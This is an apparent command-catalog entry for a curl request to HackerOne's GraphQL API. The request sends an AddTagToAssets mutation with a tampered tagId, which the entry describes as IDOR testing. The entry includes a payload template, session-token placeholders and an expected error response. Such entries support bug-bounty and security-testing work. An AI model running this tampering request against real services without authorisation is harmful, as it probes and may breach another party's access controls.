---
data: >-
  curl -X POST https://hackerone.com/graphql -H 'Content-Type: application/json'
  -H 'Authorization: Bearer TOKEN' -d 'PAYLOAD'
tags:
  - http
  - graphql
  - exploit
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:48.084Z'
id: e33261d4-973d-4875-b6f3-29dd65d69f3d
verified: false
validated: true
submitted: true
---
# curl-addtagtoassets

## Command

```bash
curl -X POST https://hackerone.com/graphql -H 'Content-Type: application/json' -H 'Authorization: Bearer TOKEN' -d 'PAYLOAD'
```

## Description

Sends a GraphQL mutation to add tags to assets on HackerOne, used for IDOR testing by modifying the tagId variable to probe unauthorized tags.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-H 'Authorization: Bearer TOKEN'` | Session token from logged-in cookie | Yes |
| `-d 'PAYLOAD'` | JSON payload with operationName: AddTagToAssets and tampered tagId | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://hackerone.com/graphql \
  -H 'Content-Type: application/json' \
  -H 'Authorization: Bearer YOUR_SESSION_TOKEN' \
  -d '{"operationName":"AddTagToAssets","variables":{"input":{"tagId":"TAMPERED_TAGID","assetIds":["ASSET_GID"]}},"query":"mutation AddTagToAssets($input: AddTagToAssetsInput!) { addTagToAssets(input: $input) { success } }"}'
```

### Advanced Usage

```bash
curl -X POST https://hackerone.com/graphql -H 'Cookie: SESSION=VALUE' -d 'FULL_CAPTURED_PAYLOAD_WITH_TAMPERED_ID'
```

## Expected Output

JSON response like {"data":null,"errors":[{"message":"AsmTag does not exist","type":"NOT_FOUND"}]} for invalid tags; check UI for reflection.

## Related

- [[Related Procedure]]
